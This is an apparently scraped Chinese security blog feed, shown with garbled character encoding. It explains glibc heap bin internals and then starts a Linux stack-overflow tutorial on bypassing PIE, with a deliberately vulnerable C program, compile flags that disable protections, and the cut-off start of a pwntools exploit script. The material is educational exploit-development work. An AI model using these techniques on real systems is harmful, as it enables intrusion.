å¤„ç†ã€‚åŒæ—¶ï¼Œå‡è®¾å½“å‰ <strong>unsorted bin</strong> ä¸­åªæœ‰ä¸€ä¸ª <strong>chunk</strong> çš„è¯ï¼Œä¹Ÿå°±æ˜¯ <strong>last remainder chunk</strong> ï¼Œé‚£ä¹ˆå°±å°†è¯¥ <strong>chunk</strong> åˆ†æˆä¸¤éƒ¨åˆ†ï¼šå‰è€…åˆ†é…ç»™ç”¨æˆ·ï¼Œå‰©ä¸‹çš„éƒ¨åˆ†æ”¾åˆ° <strong>unsorted bin</strong> ä¸­ï¼Œå¹¶æˆä¸ºæ–°çš„ <strong>last remainder chunk</strong> ã€‚è¿™æ ·å°±ä¿è¯äº†è¿ç»­ <code>malloc</code> äº§ç”Ÿçš„å„ä¸ª <strong>small chunk</strong> åœ¨å†…å­˜åˆ†å¸ƒä¸­æ˜¯ç›¸é‚»çš„ï¼Œå³æé«˜äº†å†…å­˜åˆ†é…çš„å±€éƒ¨æ€§ã€‚</p><h2 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h2><h3 id="ä»‹ç»-2"><a href="#ä»‹ç»-2" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>ç”¨æˆ·é‡Šæ”¾æ‰çš„ <strong>chunk</strong> ä¸ä¼šé©¬ä¸Šå½’è¿˜ç»™ç³»ç»Ÿï¼Œ<strong>ptmalloc</strong> ä¼šç»Ÿä¸€ç®¡ç† <strong>heap</strong> å’Œ <strong>mmap</strong> æ˜ å°„åŒºåŸŸä¸­çš„ç©ºé—²çš„ <strong>chunk</strong>ã€‚å½“ç”¨æˆ·å†ä¸€æ¬¡è¯·æ±‚åˆ†é…å†…å­˜æ—¶ï¼Œ<strong>ptmalloc</strong> åˆ†é…å™¨ä¼šè¯•å›¾åœ¨ç©ºé—²çš„ <strong>chunk</strong> ä¸­æŒ‘é€‰ä¸€å—åˆé€‚çš„ç»™ç”¨æˆ·ã€‚è¿™æ ·å¯ä»¥é¿å…é¢‘ç¹çš„ç³»ç»Ÿè°ƒç”¨ï¼Œé™ä½å†…å­˜åˆ†é…çš„å¼€é”€ã€‚</p><p>åœ¨å…·ä½“çš„å®ç°ä¸­ï¼Œ<strong>ptmalloc</strong> é‡‡ç”¨åˆ†ç®±å¼æ–¹æ³•å¯¹ç©ºé—²çš„ <strong>chunk</strong> è¿›è¡Œç®¡ç†ã€‚é¦–å…ˆï¼Œå®ƒä¼šæ ¹æ®ç©ºé—²çš„ <strong>chunk</strong> çš„å¤§å°ä»¥åŠä½¿ç”¨çŠ¶æ€å°† <strong>chunk</strong> åˆæ­¥åˆ†ä¸º 4 ç±»ï¼š<strong>fast bins</strong>ï¼Œ<strong>small bins</strong>ï¼Œ<strong>large bins</strong>ï¼Œ<strong>unsorted bin</strong>ã€‚æ¯ç±»ä¸­ä»ç„¶æœ‰æ›´ç»†çš„åˆ’åˆ†ï¼Œç›¸ä¼¼å¤§å°çš„<strong>chunk</strong> ä¼šç”¨åŒå‘é“¾è¡¨é“¾æ¥èµ·æ¥ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨æ¯ç±»<strong>bin</strong> çš„å†…éƒ¨ä»ç„¶ä¼šæœ‰å¤šä¸ªäº’ä¸ç›¸å…³çš„é“¾è¡¨æ¥ä¿å­˜ä¸åŒå¤§å°çš„ <strong>chunk</strong>ã€‚</p><p>å¯¹äº <strong>small bins</strong>ï¼Œ<strong>large bins</strong>ï¼Œ<strong>unsorted bin</strong> æ¥è¯´ï¼Œ<code>ptmalloc</code> å°†å®ƒä»¬ç»´æŠ¤åœ¨åŒä¸€ä¸ªæ•°ç»„ä¸­ã€‚è¿™äº› <strong>bin</strong> å¯¹åº”çš„æ•°æ®ç»“æ„åœ¨<code>malloc_state</code> ä¸­ï¼Œå¦‚ä¸‹</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NBINS 128</span></span><br><span class="line"><span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">mchunkptr bins[ NBINS * <span class="number">2</span> - <span class="number">2</span> ];</span><br></pre></td></tr></table></figure><p><strong>bin</strong> ä½œä¸ºä¸€ç§è®°å½• <strong>free chunk</strong> çš„é“¾è¡¨æ•°æ®ç»“æ„ã€‚ç³»ç»Ÿé’ˆå¯¹ä¸åŒå¤§å°çš„ <strong>free chunk</strong> ï¼Œå°† <strong>bin</strong> åˆ†ä¸ºäº† 4 ç±»ï¼š</p><ul><li>fast binï¼ˆæ€»å…±æœ‰10ä¸ªï¼‰</li><li>unsorted binï¼ˆåªæœ‰ä¸€ä¸ªï¼‰</li><li>small binï¼ˆæ€»å…±æœ‰ 62 ä¸ªï¼‰</li><li>large binï¼ˆæ€»å…±æœ‰63ä¸ªï¼‰</li></ul><p>åŒæ—¶ï¼Œåœ¨ <code>glibc</code> ä¸­ç”¨äºè®°å½• <strong>bin</strong> çš„æ•°æ®ç»“æ„æœ‰ä¸¤ç§ï¼Œåˆ†åˆ«ä¸ºï¼š</p><ul><li><code>fastbinsY</code>: è¿™æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œç”¨äºè®°å½•æ‰€æœ‰çš„ <strong>fast bin</strong></li><li><code>bins</code> æ•°ç»„: è¿™ä¹Ÿæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œç”¨äºè®°å½•é™¤ <strong>fast bin</strong> ä¹‹å¤–çš„æ‰€æœ‰ <strong>bin</strong> ã€‚äº‹å®ä¸Šè¿™ä¸ªæ•°ç»„å…±æœ‰ 126 ä¸ª<strong>bin</strong>ï¼Œåˆ†åˆ«æ˜¯ï¼š<ul><li>bin [1] : <strong>unsorted bin</strong></li><li>bin [2~63] : <strong>small bin</strong></li><li>bin [64~126] : <strong>large bin</strong></li></ul></li></ul><h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><p>å¯¹äºsizeè¾ƒå°çš„<strong>chunk</strong>ï¼Œé‡Šæ”¾ä¹‹åå•ç‹¬å¤„ç†ï¼Œè¢«æ”¾å…¥<strong>fast bin</strong>ä¸­ã€‚</p><ul><li>32ä½ç³»ç»Ÿï¼Œ<strong>fast bin</strong>ä¸­çš„<strong>chunk</strong>å¤§å°èŒƒå›´åœ¨16å­—èŠ‚åˆ°64å­—èŠ‚ï¼›</li><li>64ä½ç³»ç»Ÿï¼Œ<strong>fast bin</strong>ä¸­çš„<strong>chunk</strong>å¤§å°èŒƒå›´åœ¨32å­—èŠ‚åˆ°128å­—èŠ‚ã€‚</li></ul><p>ä¸‹å›¾æ˜¯32ä½ç³»ç»Ÿåˆ†å¸ƒå›¾ï¼š</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Random-img/master/HeapOverflow/12.png" alt="fast bin"></p><p>ä¸‹å›¾ä¸º64ä½ç³»ç»Ÿçš„ï¼š</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Random-img/master/HeapOverflow/14.png" alt="img"></p><p>åœ¨å†…å­˜åˆ†é…å’Œé‡Šæ”¾è¿‡ç¨‹ä¸­ï¼Œ<strong>fast bin</strong> æ˜¯æ‰€æœ‰ <strong>bin</strong> ä¸­æ“ä½œé€Ÿåº¦æœ€å¿«çš„ã€‚ä¸‹é¢è¯¦ç»†ä»‹ç» <strong>fast bin</strong> çš„ä¸€äº›ç‰¹æ€§ï¼š</p><ol><li><strong>fast bin</strong> çš„ä¸ªæ•°ï¼šæ€»å…±æœ‰10ä¸ª</li><li>è¿™ç±»<strong>bin</strong>é€šå¸¸ç”³è¯·å’Œé‡Šæ”¾çš„å †å—éƒ½æ¯”è¾ƒå°ï¼Œæ‰€ä»¥ä½¿ç”¨å•é“¾è¡¨ç»“æ„ï¼ŒLIFOï¼ˆåè¿›å…ˆå‡ºï¼‰åˆ†é…ç­–ç•¥ã€‚</li><li>ä¸ºäº†é€Ÿåº¦ï¼Œ<strong>fast bin</strong>æ°¸è¿œä¸ä¼šè¿›è¡Œåˆå¹¶ï¼Œå¯¼è‡´ç›¸é‚»çš„<strong>free chunk</strong>æ— æ³•ä¸ä¹‹åˆå¹¶ã€‚ä¸ºäº†è§£å†³å†…å­˜å¤§é‡ç¢ç‰‡åŒ–ï¼Œè¿™ä¸ªé—®é¢˜å¼•å…¥äº†<code>malloc_consolidate()</code>å‡½æ•°ã€‚è¾¾åˆ°æŸäº›æ¡ä»¶æ—¶ï¼Œglibcå°±ä¼šè°ƒç”¨è¯¥å‡½æ•°å°†<strong>fast bin</strong>ä¸­çš„<strong>chunk</strong>å–å‡ºæ¥ï¼Œå’Œç›¸é‚»çš„<strong>free chunk</strong>åˆå¹¶åæ”¾å…¥<strong>unsorted bin</strong>ï¼Œæˆ–è€…ä¸<strong>top chunk</strong>åˆå¹¶å½¢æˆæ–°çš„<strong>top chunk</strong></li><li>åœ¨<strong>fastbinsY</strong>æ•°ç»„é‡ŒæŒ‰ç…§ä»å°åˆ°å¤§çš„é¡ºåºæ’åˆ—ã€‚</li></ol><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><p><strong>unsorted bin</strong> å¯ä»¥è§†ä¸ºç©ºé—² <strong>chunk</strong> å›å½’å…¶æ‰€å± <strong>bin</strong> ä¹‹å‰çš„ç¼“å†²åŒºã€‚</p><p>å…¶åœ¨ <code>glibc</code> ä¸­å…·ä½“çš„è¯´æ˜å¦‚ä¸‹</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Unsorted chunks</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    All remainders from chunk splits, as well as all returned chunks,</span></span><br><span class="line"><span class="comment">    are first placed in the &quot;unsorted&quot; bin. They are then placed</span></span><br><span class="line"><span class="comment">    in regular bins after malloc gives them ONE chance to be used before</span></span><br><span class="line"><span class="comment">    binning. So, basically, the unsorted_chunks list acts as a queue,</span></span><br><span class="line"><span class="comment">    with chunks being placed on it in free (and malloc_consolidate),</span></span><br><span class="line"><span class="comment">    and taken off (to be either used or placed in bins) in malloc.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The NON_MAIN_ARENA flag is never set for unsorted chunks, so it</span></span><br><span class="line"><span class="comment">    does not have to be taken into account in size comparisons.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>ä»ä¸‹é¢çš„å®æˆ‘ä»¬å¯ä»¥çœ‹å‡º</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The otherwise unindexable 1-bin is used to hold unsorted chunks. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unsorted_chunks(M) (bin_at(M, 1))</span></span><br></pre></td></tr></table></figure><p><strong>unsorted bin</strong> å¤„äºæˆ‘ä»¬ä¹‹å‰æ‰€è¯´çš„ <strong>bin</strong> æ•°ç»„ä¸‹æ ‡ 1 å¤„ã€‚æ•…è€Œ <strong>unsorted bin</strong> åªæœ‰ä¸€ä¸ªé“¾è¡¨ã€‚unsorted bin ä¸­çš„ç©ºé—² <strong>chunk</strong> å¤„äºä¹±åºçŠ¶æ€ï¼Œä¸»è¦æœ‰ä¸¤ä¸ªæ¥æº</p><ul><li>å½“ä¸€ä¸ªè¾ƒå¤§çš„ <strong>chunk</strong> è¢«åˆ†å‰²æˆä¸¤åŠåï¼Œå¦‚æœå‰©ä¸‹çš„éƒ¨åˆ†å¤§äº MINSIZEï¼Œå°±ä¼šè¢«æ”¾åˆ° unsorted bin ä¸­ã€‚</li><li>é‡Šæ”¾ä¸€ä¸ªä¸å±äº <strong>fast bin</strong> çš„ <strong>chunk</strong>ï¼Œå¹¶ä¸”è¯¥ <strong>chunk</strong> ä¸å’Œ <strong>top chunk</strong> ç´§é‚»æ—¶ï¼Œè¯¥ <strong>chunk</strong> ä¼šè¢«é¦–å…ˆæ”¾åˆ° <strong>unsorted bin</strong> ä¸­å¯ä»¥åŠ å¿«åˆ†é…é€Ÿåº¦ã€‚ä½¿ç”¨åŒé“¾è¡¨ç»“æ„ï¼ŒFIFOï¼ˆå…ˆè¿›å…ˆå‡ºï¼‰åˆ†é…ç­–ç•¥ã€‚</li></ul><p>ä»¥64ä½ä¸ºä¾‹ï¼Œ<strong>unsorted bin</strong>ç»“æ„å¦‚ä¸‹ï¼ˆéè¿ç»­å†…å­˜ï¼Œå¤§å°æ— é™åˆ¶ï¼‰ï¼š</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Random-img/master/HeapOverflow/15.png" alt="img"></p><h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><p>åŒä¸€ä¸ª<strong>small bin</strong>é‡Œchunkçš„å¤§å°ç›¸åŒï¼Œé‡‡ç”¨åŒé“¾è¡¨ç»“æ„ï¼Œä½¿ç”¨é¢‘ç‡ä»‹äº<strong>fast bin</strong>å’Œ<strong>large bin</strong>ä¹‹é—´ã€‚æ¯ä¸ªé“¾è¡¨éƒ½æœ‰é“¾è¡¨å¤´ç»“ç‚¹ï¼Œè¿™æ ·å¯ä»¥æ–¹ä¾¿å¯¹äºé“¾è¡¨å†…éƒ¨ç»“ç‚¹çš„ç®¡ç†ã€‚æ­¤å¤–ï¼Œ<strong>small bins</strong> ä¸­æ¯ä¸ª <strong>bin</strong> å¯¹åº”çš„é“¾è¡¨é‡‡ç”¨ FIFOï¼ˆå…ˆè¿›å…ˆå‡ºï¼‰ çš„è§„åˆ™ï¼Œæ‰€ä»¥åŒä¸€ä¸ªé“¾è¡¨ä¸­å…ˆè¢«é‡Šæ”¾çš„ <strong>chunk</strong> ä¼šå…ˆè¢«åˆ†é…å‡ºå»ã€‚<strong>small bin</strong>åœ¨<strong>bins</strong>ä¸­å±…ç¬¬2åˆ°ç¬¬63ä½ï¼Œå…±62ä¸ªã€‚<strong>small bins</strong> ä¸­æ¯ä¸ª <strong>chunk</strong> çš„å¤§å°ä¸å…¶æ‰€åœ¨çš„ <strong>bin</strong> çš„ <strong>index</strong> çš„å…³ç³»ä¸ºï¼š<code>chunk_size = 2 * SIZE_SZ * index</code>ï¼Œå…·ä½“å¦‚ä¸‹</p><table><thead><tr><th align="left">ä¸‹æ ‡</th><th align="left">SIZE_SZ=4ï¼ˆ32 ä½ï¼‰</th><th align="left">SIZE_SZ=8ï¼ˆ64 ä½ï¼‰</th></tr></thead><tbody><tr><td align="left">2</td><td align="left">16</td><td align="left">32</td></tr><tr><td align="left">3</td><td align="left">24</td><td align="left">48</td></tr><tr><td align="left">4</td><td align="left">32</td><td align="left">64</td></tr><tr><td align="left">5</td><td align="left">40</td><td align="left">80</td></tr><tr><td align="left">x</td><td align="left">2*4*x</td><td align="left">2*8*x</td></tr><tr><td align="left">63</td><td align="left">504</td><td align="left">1008</td></tr></tbody></table><p><img src="https://raw.githubusercontent.com/Ascotbe/Random-img/master/HeapOverflow/16.png" alt="img"></p><h3 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h3><p><strong>large bins</strong> ä¸­ä¸€å…±åŒ…æ‹¬ 63 ä¸ª <strong>bin</strong>ï¼Œæ¯ä¸ª <strong>bin</strong> ä¸­çš„ <strong>chunk</strong> çš„å¤§å°ä¸ä¸€è‡´ï¼Œè€Œæ˜¯å¤„äºä¸€å®šåŒºé—´èŒƒå›´å†…ã€‚æ­¤å¤–ï¼Œè¿™ 63 ä¸ª <strong>bin</strong> è¢«åˆ†æˆäº† 6 ç»„ï¼Œæ¯ç»„ <strong>bin</strong> ä¸­çš„ <strong>chunk</strong> å¤§å°ä¹‹é—´çš„å…¬å·®ä¸€è‡´ï¼Œå…·ä½“å¦‚ä¸‹ï¼š</p><table><thead><tr><th align="left">ç»„</th><th align="left">æ•°é‡</th><th align="left">å…¬å·®</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">32</td><td align="left">64</td></tr><tr><td align="left">2</td><td align="left">16</td><td align="left">512</td></tr><tr><td align="left">3</td><td align="left">8</td><td align="left">4096</td></tr><tr><td align="left">4</td><td align="left">4</td><td align="left">32768</td></tr><tr><td align="left">5</td><td align="left">2</td><td align="left">262144</td></tr><tr><td align="left">6</td><td align="left">1</td><td align="left">ä¸é™åˆ¶</td></tr></tbody></table><p>è¿™é‡Œæˆ‘ä»¬ä»¥ 32 ä½å¹³å°çš„ <strong>large bin</strong> ä¸ºä¾‹ï¼Œç¬¬ä¸€ä¸ª <strong>large bin</strong> çš„èµ·å§‹ <strong>chunk</strong> å¤§å°ä¸º 512 å­—èŠ‚ï¼Œç¬¬äºŒä¸ª<strong>large bin</strong>çš„<strong>chunk</strong>æœ€å°ä¸º512+64å­—èŠ‚ï¼ˆå¤„äº<code>[512,512+64)</code>ä¹‹é—´çš„<strong>chunk</strong>éƒ½å±äºç¬¬ä¸€ä¸ª<strong>large bin</strong>ï¼‰ï¼Œä»¥æ­¤ç±»æ¨ï¼Œç›´åˆ°ç¬¬ä¸€ç»„ç»“æŸã€‚64ä½å¹³å°ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œç¬¬ä¸€ä¸ª<strong>large bin</strong>çš„<strong>chunk</strong>æœ€å°ä¸º1024å­—èŠ‚ï¼Œç¬¬äºŒä¸ª<strong>large bin</strong>çš„<strong>chunk</strong>æœ€å°ä¸º1024+64å­—èŠ‚ï¼ˆå¤„äº<code>[1024,1024+64)</code>ä¹‹é—´çš„<strong>chunk</strong>éƒ½å±äºç¬¬ä¸€ä¸ªlarge binï¼‰</p><p>ä¸‹é¢é™„ä¸Šå„ç±»ä¸Šè¿°ä¸‰ç±» <strong>bin</strong> çš„é€»è¾‘ï¼š</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Random-img/master/HeapOverflow/13.jpg" alt="img"></p><p>ç„¶åé™„å¸¦ä¸€å¼ glibcå†…å­˜ç®¡ç†æµç¨‹å›¾</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Random-img/master/HeapOverflow/17.png" alt="img"></p><h2 id="å †å—å¯»æ‰¾é¡ºåº"><a href="#å †å—å¯»æ‰¾é¡ºåº" class="headerlink" title="å †å—å¯»æ‰¾é¡ºåº"></a>å †å—å¯»æ‰¾é¡ºåº</h2><p>ä¸ºäº†ä»¥æœ€å¿«çš„é€Ÿåº¦æ‰¾åˆ°æœ€åˆé€‚çš„å †å—ï¼Œglibcæ ¹æ®ç”³è¯·å †å—çš„å¤§å°ã€å„ä¸ªbinçš„çŠ¶æ€ä»”ç»†çš„å®‰æ’äº†åˆ†é…é¡ºåºå’Œå†…å­˜æ•´ç†çš„æ—¶æœºã€‚å…¶å¤§æ¦‚æœç´¢é¡ºåºï¼ˆç”±<code>_int_malloc()</code>è¿›è¡Œåˆ†é…ï¼‰ï¼š</p><ol><li>fast binï¼ˆå¯»æ‰¾å¤§å°å®Œå…¨ä¸€æ ·ï¼‰</li><li>small binï¼ˆå¯»æ‰¾å¤§å°å®Œå…¨ä¸€æ ·ï¼‰</li><li>unsorted binï¼ˆå¯»æ‰¾å¤§å°å®Œå…¨ä¸€æ ·ï¼‰</li><li>large binï¼ˆå¦‚æœç”³è¯·è¾ƒå¤§çš„æ˜¯chunkï¼Œå¯»æ‰¾æœ€å°èƒ½æ»¡è¶³çš„ï¼‰</li><li>binsï¼ˆå¯»æ‰¾æœ€å°èƒ½æ»¡è¶³çš„ï¼‰</li><li>top chunkï¼ˆåˆ‡é™¤åˆé€‚çš„chunkï¼‰</li><li>ç³»ç»Ÿå‡½æ•°åˆ†é…</li></ol><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;introspelliam.github.io&#x2F;2017&#x2F;09&#x2F;10&#x2F;Linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;murphypei.github.io&#x2F;blog&#x2F;2019&#x2F;01&#x2F;linux-heap</span><br><span class="line">https:&#x2F;&#x2F;sploitfun.wordpress.com&#x2F;2015&#x2F;02&#x2F;10&#x2F;understanding-glibc-malloc&#x2F;comment-page-1&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;abcdxyzk.github.io&#x2F;blog&#x2F;2015&#x2F;08&#x2F;05&#x2F;kernel-mm-malloc&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;unr4v31&#x2F;p&#x2F;14446412.html</span><br><span class="line">https:&#x2F;&#x2F;ctf-wiki.org&#x2F;pwn&#x2F;linux&#x2F;glibc-heap&#x2F;heap_structure&#x2F;#fast-bin</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Linuxæ ˆæº¢å‡ºæ€»ç»“ï¼ˆ0x03ï¼‰</title>
    <link href="https://www.ascotbe.com/2021/03/26/StackOverflow_Linux_0x03/"/>
    <id>https://www.ascotbe.com/2021/03/26/StackOverflow_Linux_0x03/</id>
    <published>2021-03-26T10:45:42.000Z</published>
    <updated>2021-05-17T02:10:15.663Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å£°æ˜</p></blockquote><p>éƒ‘é‡å£°æ˜ï¼šæ–‡ä¸­æ‰€æ¶‰åŠçš„æŠ€æœ¯ã€æ€è·¯å’Œå·¥å…·ä»…ä¾›ä»¥å®‰å…¨ä¸ºç›®çš„çš„å­¦ä¹ äº¤æµä½¿ç”¨ï¼Œä»»ä½•äººä¸å¾—å°†å…¶ç”¨äºéæ³•ç”¨é€”ä»¥åŠç›ˆåˆ©ç­‰ç›®çš„ï¼Œå¦åˆ™åæœè‡ªè¡Œæ‰¿æ‹…ï¼</p><blockquote><p>å‰è¨€</p></blockquote><p>ä¸Šç¯‡æ–‡ç« çœŸçš„å°±æ˜¯ä¸€æ”¹å°±èŠ±äº†ä¸€ä¸ªæœˆæ—¶é—´ï¼Œç„¶åå‘ç°ç¯‡å¹…æœ‰ç‚¹å¤ªé•¿äº†åˆ†å‰²ä¸€ä¸‹ï¼Œæ„Ÿè§‰è¿™ç¯‡ä¹Ÿéœ€è¦å¥½ä¹…</p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/27.png" alt="image-20210326103216832" style="zoom:50%;" /><blockquote><p>è®°å½•</p></blockquote><p>å‡ ä¸ªæœªå¡«å‘çš„ç‚¹</p><ul><li>å¦‚ä½•è®¡ç®—å‡ºTLSçš„offsetå¤§å°ï¼ˆEXPæŠ„çš„ï¼Œæˆ‘ä¹Ÿæ‡µ</li><li>SSPé¢˜ç›®ä¸­ï¼Œä¸ºä»€ä¹ˆå½“å¯æ‰§è¡Œæ–‡ä»¶è¶³å¤Ÿå°çš„æ—¶å€™ï¼Œä»–çš„ä¸åŒåŒºæ®µå¯èƒ½ä¼šè¢«å¤šæ¬¡æ˜ å°„ï¼Ÿ</li></ul><blockquote><h2 id="ç»•è¿‡PIEä¿æŠ¤"><a href="#ç»•è¿‡PIEä¿æŠ¤" class="headerlink" title="ç»•è¿‡PIEä¿æŠ¤"></a>ç»•è¿‡PIEä¿æŠ¤</h2></blockquote><p>æµ‹è¯•ä»£ç ï¼ˆé¢˜ç›®æ³„éœ²åœ°å€ï¼‰</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln_func</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">read(STDIN_FILENO, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,&amp;main);</span><br><span class="line">vuln_func();</span><br><span class="line">write(STDOUT_FILENO, <span class="string">&quot;Hello world!\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘äº§ç”Ÿä¿®æ”¹ä¸º<code>-pie -fpie</code>ï¼Œä¸<code>-pie -fno-pie</code>ä¸åŒçš„æ˜¯ï¼Œå®ƒä¸å†å¯¹ç¨‹åºåŸå§‹å­—èŠ‚ç åšä¿®æ”¹ï¼Œè€Œæ˜¯ä½¿ç”¨äº†ä¸€ç±»  <strong>__x86.get_pc.thunk</strong>å‡½æ•°ï¼Œé€šè¿‡PCæŒ‡é’ˆæ¥åšå®šä½</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -z noexecstack -pie -fpie test.c -o test2.out</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/28.png" alt="image-20210326152720436"></p><p>å¯ä»¥çœ‹åˆ°callå‡½æ•°çš„åœ°å€å˜æˆäº†ä¸Šè¿°æˆ‘ä»¬æ‰€è¯´çš„ï¼Œç”±äº<strong>__x86.get_pc.thunk</strong>çš„ä½œç”¨å°†ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€èµ‹å€¼ç»™EBXå¯„å­˜å™¨ï¼Œç„¶åé€šè¿‡åŠ ä¸Šä¸€ä¸ªåç§»å¾—åˆ°å½“å‰è¿›ç¨‹çš„GOTè¡¨çš„åœ°å€ï¼Œå¹¶ä»¥æ­¤ä½œä¸ºåç»­çš„åŸºåœ°å€ã€‚</p><div class="note info modern"><p>PIEæŠ€æœ¯çš„ç¼ºé™·ï¼šæˆ‘ä»¬çŸ¥é“ï¼Œå†…å­˜æ˜¯ä»¥é¡µè½½å…¥æœºåˆ¶ï¼Œå¦‚æœå¼€å¯PIEä¿æŠ¤çš„è¯ï¼Œåªèƒ½å½±å“åˆ°å•ä¸ªå†…å­˜é¡µï¼Œä¸€ä¸ªå†…å­˜é¡µå¤§å°ä¸º0x1000ï¼Œé‚£ä¹ˆå°±æ„å‘³ç€ä¸ç®¡åœ°å€æ€ä¹ˆå˜ï¼ŒæŸä¸€æ¡æŒ‡ä»¤çš„åä¸‰ä½åå…­è¿›åˆ¶æ•°çš„åœ°å€æ˜¯å§‹ç»ˆä¸å˜çš„ã€‚</p></div><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/29.png" alt="image-20210326153042242"></p><p>çŸ¥é“äº†è¿™äº›æˆ‘ä»¬å°±å¯ä»¥ç¼–å†™EXPäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./test2.out&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./test2.out&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib32/libc.so.6&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">main_addr = <span class="built_in">int</span>(io.recvline(), <span class="number">16</span>)<span class="comment">#è·å–printfè¾“å‡ºçš„mainå‡½æ•°åœ°å€</span></span><br><span class="line">start_addr = main_addr - elf.sym[<span 